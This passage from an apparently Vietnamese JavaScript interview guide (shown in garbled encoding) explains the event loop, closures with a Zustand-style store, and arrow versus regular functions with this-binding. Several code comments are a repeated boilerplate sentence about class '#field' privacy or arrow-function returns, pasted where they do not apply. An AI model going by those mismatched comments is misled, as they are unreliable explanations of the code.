// üì∫ T√¥i xem TV trong l√∫c ƒë·ª£i            ‚Üê Ngay l·∫≠p t·ª©c
// üçø T√¥i ƒÉn b·ªèng ng√¥                     ‚Üê Ngay l·∫≠p t·ª©c
// üí≠ Nh·∫Øc b·∫£n th√¢n: Nh·ªõ l·∫•y ti·ªÅn tip     ‚Üê Microtask (∆∞u ti√™n cao)
// (ch·ªù 3 gi√¢y...)
// üçï Pizza giao ƒë·∫øn, t√¥i m·ªü c·ª≠a nh·∫≠n     ‚Üê Macrotask (sau c√πng)
```

**Gi·∫£i th√≠ch:**
1. B·∫°n l√†m h·∫øt vi·ªác ƒëang l√†m (xem TV, ƒÉn b·ªèng ng√¥)
2. Nh·ªõ l·∫•y ti·ªÅn tip (Microtask - vi·ªác quan tr·ªçng)
3. Cu·ªëi c√πng m·ªõi nh·∫≠n pizza (Macrotask - ƒë√£ h·∫πn tr∆∞·ªõc 3 gi√¢y)

---

**üöó V√ç D·ª§: ƒêI SI√äU TH·ªä**

```javascript
console.log('üöó T√¥i l√°i xe ƒë·∫øn si√™u th·ªã');

// ƒê·∫∑t h·∫πn gi·ªù b√°o th·ª©c xe (setTimeout)
setTimeout(() => {
  console.log('‚è∞ B√°o th·ª©c: ƒê√£ 1 gi·ªù, v·ªÅ nh√† th√¥i!');
}, 3600000); // Ch√∫ gi·∫£i: 1 gi·ªù

console.log('üõí T√¥i l·∫•y gi·ªè v√† ƒëi mua s·∫Øm');

// Nh·ªõ vi·ªác quan tr·ªçng (Promise)
Promise.resolve().then(() => {
  console.log('üí° ·ªí nh·ªõ r·ªìi! Ph·∫£i mua s·ªØa cho con');
});

console.log('ü•¨ T√¥i mua rau c·ªß');

 // Ch√∫ gi·∫£i: ===== OUTPUT =====
// üöó T√¥i l√°i xe ƒë·∫øn si√™u th·ªã             ‚Üê Ngay l·∫≠p t·ª©c
// üõí T√¥i l·∫•y gi·ªè v√† ƒëi mua s·∫Øm           ‚Üê Ngay l·∫≠p t·ª©c
// ü•¨ T√¥i mua rau c·ªß                      ‚Üê Ngay l·∫≠p t·ª©c
 // Ch√∫ gi·∫£i: üí° ·ªí nh·ªõ r·ªìi! Ph·∫£i mua s·ªØa cho con     ‚Üê Microtask (nh·ªõ ngay)
 // Ch√∫ gi·∫£i: (ch·ªù 1 gi·ªù...)
// ‚è∞ B√°o th·ª©c: ƒê√£ 1 gi·ªù, v·ªÅ nh√† th√¥i!    ‚Üê Macrotask (h·∫πn gi·ªù)
```

---

**‚ö†Ô∏è T√åNH HU·ªêNG X·∫§U: KH√ÅCH VIP V√î H·∫†N (Microtask Starvation)**

```javascript
console.log('üè™ Qu√°n m·ªü c·ª≠a');

// Kh√°ch th∆∞·ªùng ƒë·∫∑t h√†ng
setTimeout(() => {
  console.log('üò¢ Kh√°ch th∆∞·ªùng: T√¥i ch·ªù m√£i kh√¥ng t·ªõi l∆∞·ª£t!');
}, 0);

// Kh√°ch VIP li√™n t·ª•c (V√î H·∫†N!)
function khachVIPLienTuc() {
  Promise.resolve().then(() => {
    console.log('‚≠ê Kh√°ch VIP: Ph·ª•c v·ª• t√¥i ƒëi!');
    khachVIPLienTuc(); // T·∫°o th√™m kh√°ch VIP m·ªõi!
  });
}

khachVIPLienTuc();

// ===== K·∫æT QU·∫¢ =====
// üè™ Qu√°n m·ªü c·ª≠a
// ‚≠ê Kh√°ch VIP: Ph·ª•c v·ª• t√¥i ƒëi!
// ‚≠ê Kh√°ch VIP: Ph·ª•c v·ª• t√¥i ƒëi!
// ‚≠ê Kh√°ch VIP: Ph·ª•c v·ª• t√¥i ƒëi!
// ... (v√¥ h·∫°n l·∫ßn)
// üò¢ Kh√°ch th∆∞·ªùng: KH√îNG BAO GI·ªú ƒë∆∞·ª£c ph·ª•c v·ª•!

// ‚ö†Ô∏è L·ªñI: B·∫°n ch·ªâ ph·ª•c v·ª• kh√°ch VIP m√£i, kh√°ch th∆∞·ªùng ƒë√≥i ch·∫øt!
```

---

**‚úÖ NGUY√äN T·∫ÆC V√ÄNG (Kh√¥ng Technical):**

1. **L√†m vi·ªác ƒëang l√†m tr∆∞·ªõc** (Code ƒë·ªìng b·ªô)
2. **∆Øu ti√™n kh√°ch VIP** (Promise, Microtask)
3. **Sau ƒë√≥ m·ªõi ƒë·∫øn kh√°ch th∆∞·ªùng** (setTimeout, Macrotask)
4. **Kh√¥ng t·∫°o kh√°ch VIP v√¥ h·∫°n** (tr√°nh Microtask Starvation)
5. **Lu√¥n check l·∫°i** (Event Loop l·∫∑p m√£i)

---

**üéØ T√ìM T·∫ÆT B·∫∞NG 1 C√ÇU:**

> **"L√†m h·∫øt vi·ªác ƒëang l√†m, ∆∞u ti√™n kh√°ch VIP, r·ªìi m·ªõi ph·ª•c v·ª• kh√°ch th∆∞·ªùng, v√† c·ª© th·∫ø l·∫∑p l·∫°i m√£i."**

---

**üìù SO S√ÅNH V·ªöI ƒê·ªúI S·ªêNG TH·ª∞C:**

| Thu·∫≠t Ng·ªØ Technical | V√≠ D·ª• ƒê·ªùi Th∆∞·ªùng |
|---------------------|------------------|
| Call Stack | Vi·ªác ƒëang l√†m (pha c√† ph√™, v·∫Øt cam) |
| Microtask Queue | Danh s√°ch kh√°ch VIP (∆∞u ti√™n cao) |
| Macrotask Queue | Danh s√°ch kh√°ch th∆∞·ªùng (ch·ªù l√¢u h∆°n) |
| Event Loop | B·∫°n li√™n t·ª•c check xem c√≤n vi·ªác g√¨ ch∆∞a |
| Web APIs | M√°y pha t·ª± ƒë·ªông, ƒë·ªìng h·ªì h·∫πn gi·ªù |
| Single Thread | Ch·ªâ c√≥ 1 b·∫°n l√†m vi·ªác, kh√¥ng c√≥ nh√¢n vi√™n ph·ª• |
| Non-blocking | Kh√¥ng ƒë·ª©ng ƒë·ª£i, l√†m vi·ªác kh√°c trong l√∫c ch·ªù |
| Async | ƒê·∫∑t h·∫πn gi·ªù, ch·ªù giao h√†ng |

---

**üéì B√ÄI H·ªåC:**

- JavaScript ch·ªâ c√≥ **1 ng∆∞·ªùi l√†m vi·ªác** (single-threaded)
- Nh∆∞ng **r·∫•t th√¥ng minh**: kh√¥ng ƒë·ª£i, l√†m nhi·ªÅu vi·ªác c√πng l√∫c nh·ªù **∆∞u ti√™n** v√† **h·∫πn gi·ªù**
- **Kh√°ch VIP** (Microtask) lu√¥n ƒë∆∞·ª£c ∆∞u ti√™n h∆°n **kh√°ch th∆∞·ªùng** (Macrotask)
- Ph·∫£i **c·∫©n th·∫≠n** kh√¥ng t·∫°o kh√°ch VIP v√¥ h·∫°n, n·∫øu kh√¥ng kh√°ch th∆∞·ªùng ƒë√≥i ch·∫øt!

**üí° Nh·ªõ c√¥ng th·ª©c:**
```
L√†m xong vi·ªác ƒëang l√†m
‚Üí Ph·ª•c v·ª• H·∫æT kh√°ch VIP
‚Üí Ph·ª•c v·ª• M·ªòT kh√°ch th∆∞·ªùng
‚Üí L·∫∑p l·∫°i
```

---
---
## 08. üîê Q08: Closure & Data Privacy  

**P1: T√™n c√¢u h·ªèi:** üîê Q08: Closure & Data Privacy  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (1-2 ph√∫t):**

**"Closure = h√†m + m√¥i tr∆∞·ªùng t·ª´ v·ª±ng (c√°c bi·∫øn xung quanh n√≥). H√†m b√™n trong gi·ªØ tham chi·∫øu ƒë·∫øn bi·∫øn scope b√™n ngo√†i.**

**üì¶ Core Concepts:**
- **Definition**: Function nh·ªõ ƒë∆∞·ª£c v√† access ƒë∆∞·ª£c bi·∫øn t·ª´ outer scope, ngay c·∫£ khi outer function ƒë√£ return.
- **Mechanism**: Inner function gi·ªØ reference ƒë·∫øn [[Scope]] (lexical environment) c·ªßa outer function.
- **Data Privacy**: D√πng closure ƒë·ªÉ t·∫°o private variables/methods (encapsulation).

**üéØ Use Cases:**
1. **Private Variables**: Factory functions tr·∫£ v·ªÅ object v·ªõi methods access private state.
2. **Module Pattern**: IIFE + closure ‚Üí private state + public API.
3. **Event Handlers**: Callback gi·ªØ reference ƒë·∫øn outer variables.
4. **Partial Application**: Currying, function factories (e.g., `makeAdder(5)`).
5. **Memoization**: Cache results c·ªßa expensive functions.

**‚ö†Ô∏è Common Pitfalls:**
- **Memory Leaks**: Closure gi·ªØ reference ‚Üí bi·∫øn kh√¥ng b·ªã GC ‚Üí memory leak n·∫øu kh√¥ng cleanup.
  ```js
  function setupButton() {
    const hugeArray = new Array(1000000); // Ch√∫ gi·∫£i: 8MB
    document.getElementById('btn').onclick = () => {
      console.log(hugeArray.length); // Closure gi·ªØ reference ‚Üí kh√¥ng GC!
    };
  }
  // Fix: X√≥a reference khi kh√¥ng d√πng
  ```
- **Loop + Closures**: `var` trong loop ‚Üí m·ªçi closure chia s·∫ª c√πng bi·∫øn.
  ```js
 // Ch√∫ gi·∫£i: ‚ùå Sai
  for (var i = 0; i < 3; i++) {
    setTimeout(() => console.log(i), 100); // Ch√∫ gi·∫£i: 3, 3, 3
  }
  // ‚úÖ ƒê√∫ng: D√πng let (block scope) ho·∫∑c IIFE
  for (let i = 0; i < 3; i++) {
    setTimeout(() => console.log(i), 100); // Ch√∫ gi·∫£i: 0, 1, 2
  }
  ```

**üí° Senior Insights:**
- **Performance**: Closures c√≥ overhead nh·ªè (memory + lookup time), nh∆∞ng negligible trong h·∫ßu h·∫øt cases.
- **DevTools**: Chrome DevTools ‚Üí Memory Profiler ‚Üí check closure retaining objects.
- **ES6 Modules**: Replace IIFE module pattern ‚Üí native private scope.
- **WeakMap**: Alternative cho private data kh√¥ng d√πng closure ‚Üí auto GC khi object kh√¥ng c√≤n reference.

---

**‚ö° Quick Summary:**
> Closure = function nh·ªõ ƒë∆∞·ª£c bi·∫øn t·ª´ outer scope ngay c·∫£ khi outer function ƒë√£ return. D√πng ƒë·ªÉ private data

**üí° Ghi Nh·ªõ:**
- üî• **Definition**: Function + Lexical Environment (bi·∫øn xung quanh n√≥)
- üéØ **Use Cases**: Private variables, Factory functions, Callbacks, Event handlers
- ‚ö° **Memory**: Closure gi·ªØ reference ‚Üí bi·∫øn kh√¥ng b·ªã GC ‚Üí c·∫©n th·∫≠n memory leak
- üì¶ **Module Pattern**: IIFE + Closure = private state

**Tr·∫£ l·ªùi:**

- **Closure**: Function c√≥ th·ªÉ access variables t·ª´ outer scope ngay c·∫£ khi outer function ƒë√£ return
- **Data Privacy**: S·ª≠ d·ª•ng closure ƒë·ªÉ t·∫°o private variables
- **Ho·∫°t ƒë·ªông**: Inner function gi·ªØ reference ƒë·∫øn outer scope
- **∆Øu ƒëi·ªÉm**: Encapsulation, data privacy, module pattern
- **Nh∆∞·ª£c ƒëi·ªÉm**: C√≥ th·ªÉ g√¢y memory leaks n·∫øu kh√¥ng qu·∫£n l√Ω t·ªët

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: Basic Closure
function outerFunction(x: number) {
 // Ch√∫ gi·∫£i: Outer scope variable
  let outerVariable = x;

 // Ch√∫ gi·∫£i: Inner function (closure)
  function innerFunction(y: number): number {
    return outerVariable + y; // Ch√∫ gi·∫£i: Access outer variable
  }

  return innerFunction;
}

const closure = outerFunction(10);
console.log(closure(5)); // Ch√∫ gi·∫£i: 15
// outerFunction ƒë√£ return nh∆∞ng innerFunction v·∫´n access ƒë∆∞·ª£c outerVariable

 // Ch√∫ gi·∫£i: Data Privacy v·ªõi Closure
function createCounter(): { increment: () => number; getCount: () => number } {
  let count = 0; // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.

  return {
    increment(): number {
      return ++count; // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
    },
    getCount(): number {
      return count; // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
    },
  };
}

const counter = createCounter();
console.log(counter.increment()); // Ch√∫ gi·∫£i: 1
console.log(counter.increment()); // Ch√∫ gi·∫£i: 2
console.log(counter.getCount()); // Ch√∫ gi·∫£i: 2
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.

 // Ch√∫ gi·∫£i: Module Pattern
const userModule = (() => {
  let users: string[] = []; // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.

  return {
    addUser(name: string): void {
      users.push(name);
    },
    getUsers(): string[] {
      return [...users]; // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    },
    getUserCount(): number {
      return users.length;
    },
  };
})();

userModule.addUser('John');
userModule.addUser('Jane');
console.log(userModule.getUsers()); // Ch√∫ gi·∫£i: ["John", "Jane"]
console.log(userModule.getUserCount()); // Ch√∫ gi·∫£i: 2
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
```

**Best Practices:**

- S·ª≠ d·ª•ng closure cho data privacy
- S·ª≠ d·ª•ng module pattern
- Tr√°nh memory leaks
- S·ª≠ d·ª•ng TypeScript cho type safety

**Mistakes:**

```typescript
// ‚ùå Sai: Kh√¥ng hi·ªÉu closure scope
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // Ch√∫ gi·∫£i: 3, 3, 3
}

// ‚úÖ ƒê√∫ng: S·ª≠ d·ª•ng closure ƒë√∫ng c√°ch
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // Ch√∫ gi·∫£i: 0, 1, 2
}

// Ho·∫∑c s·ª≠ d·ª•ng closure v·ªõi var
for (var i = 0; i < 3; i++) {
  ((index: number) => {
    setTimeout(() => console.log(index), 100); // Ch√∫ gi·∫£i: 0, 1, 2
  })(i);
}
```

#### V√¨ sao Redux/Zustand d√πng closure ƒë·ªÉ l∆∞u tr·∫°ng th√°i?

- **Encapsulation (ƒë√≥ng g√≥i state an to√†n)**: State s·ªëng trong ph·∫°m vi t·ª´ v·ª±ng (lexical scope) c·ªßa store, kh√¥ng th·ªÉ b·ªã thay ƒë·ªïi tr·ª±c ti·∫øp t·ª´ b√™n ngo√†i n·∫øu kh√¥ng ƒëi qua API c√¥ng khai (getState, setState, subscribe). Tr√°nh l·ªô bi·∫øn to√†n c·ª•c v√† h·∫°n ch·∫ø ƒë·ªôt bi·∫øn ngo√†i √Ω mu·ªën.
- **API nh·ªè g·ªçn, kh√¥ng c·∫ßn l·ªõp/ph·ª• tr·ª£**: M·ªôt factory function t·∫°o store tr·∫£ v·ªÅ c√°c h√†m thao t√°c; closure gi·ªØ state v√† danh s√°ch listeners. Kh√¥ng b·∫Øt bu·ªôc d√πng class/this, gi·∫£m r·ªßi ro context.
- **Hi·ªáu nƒÉng d·ª± ƒëo√°n ƒë∆∞·ª£c**: Kh√¥ng c·∫ßn Proxy hay getter/setter; c·∫≠p nh·∫≠t state l√† thao t√°c thu·∫ßn (immutable/mutable t√πy chi·∫øn l∆∞·ª£c), th√¥ng b√°o qua danh s√°ch subscribers trong c√πng closure ‚Üí chi ph√≠ th·∫•p, d·ªÖ t·ªëi ∆∞u.
- **Kh·∫£ nƒÉng multiple store ƒë·ªôc l·∫≠p**: M·ªói l·∫ßn g·ªçi factory t·∫°o m·ªôt scope m·ªõi v·ªõi state ri√™ng, kh√¥ng r√≤ r·ªâ ch√©o. D·ªÖ t·∫°o nhi·ªÅu store, test theo t·ª´ng instance.

V√≠ d·ª• m√¥ ph·ªèng (ƒë∆°n gi·∫£n h√≥a theo phong c√°ch Zustand):

```ts
type Listener<T> = (state: T, prev: T) => void;

function createStore<T>(
  initializer: (
    set: (p: Partial<T> | ((s: T) => Partial<T>)) => void,
    get: () => T
  ) => T
) {
  let state: T;
  const listeners = new Set<Listener<T>>();

  const get = () => state;
  const set = (patch: Partial<T> | ((s: T) => Partial<T>)) => {
    const prev = state;
    const next =
      typeof patch === 'function'
        ? (patch as (s: T) => Partial<T>)(prev)
        : patch;
    state = { ...prev, ...next };
    listeners.forEach((l) => l(state, prev));
  };

  state = initializer(set, get);

  return {
    getState: get,
    setState: set,
    subscribe(listener: Listener<T>) {
      listeners.add(listener);
      return () => listeners.delete(listener);
    },
  };
}
```

So v·ªõi l·ª±a ch·ªçn kh√°c:

- **Class + this**: C·∫ßn r√†ng bu·ªôc ng·ªØ c·∫£nh, d·ªÖ l·ªói khi truy·ªÅn ph∆∞∆°ng th·ª©c; kh√≥ tree-shake h∆°n n·∫øu kh√¥ng c·∫©n th·∫≠n.
- **Proxy**: Ti·ªán reactive nh∆∞ng t·ªën chi ph√≠ b·∫´y (traps), ph·ª©c t·∫°p debug, kh√¥ng c·∫ßn thi·∫øt khi ch·ªâ c·∫ßn pub/sub ƒë∆°n gi·∫£n.
- **Global singleton**: D·ªÖ r√≤ r·ªâ state gi·ªØa tests/SSR, kh√≥ t·∫°o nhi·ªÅu instance ƒë·ªôc l·∫≠p.
---
## 09. ‚û°Ô∏è Q09: Arrow vs Regular Functions & this Binding (call, apply, bind)  

**P1: T√™n c√¢u h·ªèi:** ‚û°Ô∏è Q09: Arrow vs Regular Functions & this Binding (call, apply, bind)  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"Arrow function kh√°c regular function ·ªü c√°ch g·∫Øn `this`: t·ª´ v·ª±ng (scope b√™n ngo√†i) vs ƒë·ªông (ng·ªØ c·∫£nh runtime).**

**üìä Arrow vs Regular Functions (Key Differences):**
1. **`this` Binding**:
   - **Arrow**: Lexical `this` ‚Üí inherit t·ª´ outer scope (kh√¥ng c√≥ `this` ri√™ng).
   - **Regular**: Dynamic `this` ‚Üí ph·ª• thu·ªôc c√°i g√¨ g·ªçi function (runtime).

2. **`arguments` Object**:
   - **Arrow**: Kh√¥ng c√≥ `arguments` ‚Üí d√πng rest params `(...args)`.
   - **Regular**: C√≥ `arguments` (array-like object).

3. **Constructor**:
   - **Arrow**: Kh√¥ng d√πng ƒë∆∞·ª£c `new` ‚Üí throw error.
   - **Regular**: C√≥ th·ªÉ d√πng `new` ‚Üí t·∫°o instance.

4. **Hoisting**:
   - **Arrow**: Kh√¥ng hoisted (n·∫øu d√πng `const/let`).
   - **Regular**: Hoisted (function declaration).

**üîß `this` Binding Methods (call, apply, bind):**
- **`call(thisArg, arg1, arg2)`**: Invoke ngay v·ªõi arguments ri√™ng l·∫ª.
  ```js
  fn.call({ name: 'John' }, 1, 2); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  ```
- **`apply(thisArg, [args])`**: Invoke ngay v·ªõi arguments array.
  ```js
  fn.apply({ name: 'John' }, [1, 2]); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  ```
- **`bind(thisArg)`**: Return function m·ªõi v·ªõi `this` c·ªë ƒë·ªãnh (kh√¥ng invoke).
  ```js
  const boundFn = fn.bind({ name: 'John' }); // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
  boundFn(1, 2); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  ```

**üéØ `this` Binding Rules (4 Rules - Priority Order):**
1. **`new` Binding**: `new Fn()` ‚Üí `this` = new object.
2. **Explicit Binding**: `call/apply/bind` ‚Üí `this` = thisArg.
3. **Implicit Binding**: `obj.method()` ‚Üí `this` = obj.
4. **Default Binding**: Standalone function ‚Üí `this` = global object (window/global) ho·∫∑c undefined (strict mode).

**‚ö†Ô∏è Common Mistakes:**
- **Arrow trong object methods**: `this` kh√¥ng point to object!
  ```js
  const obj = {
    name: 'John',
    greet: () => console.log(this.name) // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  };
  // ‚úÖ D√πng regular function ho·∫∑c method shorthand
  ```
- **Event handlers**: Regular function ‚Üí `this` = event target. Arrow ‚Üí `this` = outer scope.
- **Class methods as callbacks**: M·∫•t context ‚Üí d√πng arrow ho·∫∑c bind.
  ```js
  class Component {
    handleClick() { console.log(this); }
    render() {
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
      button.addEventListener('click', this.handleClick);
      // ‚úÖ Fix: Arrow ho·∫∑c bind
      button.addEventListener('click', () => this.handleClick());
      button.addEventListener('click', this.handleClick.bind(this));
    }
  }
  ```

**üí° Senior Insights:**
- **React Class Components**: Arrow class fields = auto-bind `this` (babel transform).
- **Performance**: Arrow functions trong render ‚Üí t·∫°o new reference m·ªói l·∫ßn ‚Üí child re-render. D√πng `useCallback`.
- **call vs apply**: `apply` h·ªØu √≠ch khi arguments ƒë√£ l√† array (e.g., `Math.max.apply(null, [1,2,3])`).
- **Polyfill bind**: Implement bind manually ƒë·ªÉ hi·ªÉu c∆° ch·∫ø:
  ```js
  Function.prototype.myBind = function(context, ...args) {
    const fn = this;
    return function(...newArgs) {
      return fn.apply(context, [...args, ...newArgs]);
    };
  };
  ```

---

**‚ö° Quick Summary:**
> Arrow function = lexical `this` (t·ª´ outer scope), kh√¥ng c√≥ arguments, kh√¥ng d√πng new. `this` trong JS = context object, d√πng call/apply/bind ƒë·ªÉ set `this` manually.

**üí° Ghi Nh·ªõ:**
- üéØ **Arrow**: `() => {}` - this t·ª´ outer scope, kh√¥ng c√≥ arguments/constructor
- üìå **Regular**: `function(){}` - this runtime, c√≥ arguments, hoisted
- üìû **call**: `fn.call(thisArg, arg1, arg2)` - invoke ngay v·ªõi args ri√™ng l·∫ª
- üìã **apply**: `fn.apply(thisArg, [args])` - invoke ngay v·ªõi array
- üîó **bind**: `fn.bind(thisArg)` - return function m·ªõi v·ªõi this c·ªë ƒë·ªãnh


### **1. Arrow vs Regular Functions - S·ª± Kh√°c Bi·ªát Quan Tr·ªçng**

#### **1.1. Syntax & Declaration**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// SYNTAX - C√∫ ph√°p
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: Regular Function
function regularFunction(name: string): string {
  return `Hello ${name}`;
}

// Arrow Function - ng·∫Øn g·ªçn h∆°n
const arrowFunction = (name: string): string => `Hello ${name}`;

// Arrow v·ªõi 1 parameter - b·ªè ƒë∆∞·ª£c ()
const single = name => `Hello ${name}`;

 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical. Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
const getUser = (id: number) => ({ id, name: 'John' });
// Kh√¥ng c√≥ () s·∫Ω b·ªã nh·∫ßm v·ªõi block { }

 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical. Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
const calculate = (a: number, b: number) => {
  const sum = a + b;
  const product = a * b;
  return { sum, product };
};
```

#### **1.2. this Binding - Kh√°c Bi·ªát QUAN TR·ªåNG Nh·∫•t**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// THIS BINDING - ƒêi·ªÉm kh√°c bi·ªát QUAN TR·ªåNG nh·∫•t
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class Person {
  name: string = 'John';

  // ‚ùå Regular function - this l√† ƒê·ªòNG (dynamic binding)
  // this ph·ª• thu·ªôc v√†o C√ÅI G√å g·ªçi function (runtime)
  regularMethod(): void {
    setTimeout(function () {
      console.log(this.name); 
 // Ch√∫ gi·∫£i: ‚ùå undefined!
      // V√¨ function ƒë∆∞·ª£c g·ªçi b·ªüi setTimeout ‚Üí this = window/global
    }, 100);
  }

  // ‚úÖ Arrow function - this l√† Tƒ®NH (lexical binding)
  // this ƒë∆∞·ª£c "k·∫ø th·ª´a" t·ª´ outer scope (Person instance)
  arrowMethod(): void {
    setTimeout(() => {
      console.log(this.name); 
 // Ch√∫ gi·∫£i: ‚úÖ "John"!
      // Arrow function KH√îNG c√≥ this ri√™ng ‚Üí l·∫•y this t·ª´ Person
    }, 100);
  }

  // üîß C√°ch fix cho regular function
  regularMethodFixed(): void {
    const self = this; // L∆∞u this v√†o bi·∫øn
    setTimeout(function () {
      console.log(self.name); // ‚úÖ "John" - d√πng bi·∫øn self
    }, 100);
  }

  regularMethodBind(): void {
    setTimeout(function () {
      console.log(this.name); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
    }.bind(this), 100);
  }
}

